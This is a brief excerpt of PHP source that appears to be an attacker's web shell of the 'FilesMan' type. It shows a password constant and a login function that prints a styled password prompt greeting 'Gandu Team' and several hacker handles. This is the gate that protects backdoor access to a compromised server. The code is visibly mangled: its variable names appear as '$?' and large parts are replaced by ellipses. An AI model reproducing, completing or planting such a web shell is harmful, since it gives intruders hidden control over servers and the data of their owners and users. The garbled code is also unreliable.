...
//-----------------Password---------------------
$? = "1BZaAwYUi4piNjCDPoR8uMR4AamonjgkU5";
$? = true;
$? = 'UTF-8';
$? = 'FilesMan';
...
function hardLogin() {
	...
	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#000000; text-shadow: 2px 0 0 #ffd903, -2px 0 0 #ffd903, 0 2px 0 #ffd903, 0 -2px 0 #ffd903, 1px 1px #ffd903, -1px -1px 0 #ffd903, 1px -1px 0 #ffd903, -1px 1px 0 #ffd903; text-align: center;'><h3>Hello <br>Gandu Team <br> [MenuPass, GHOSTRZ, NeuroVenom_0YN, oghbnz]</h3><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
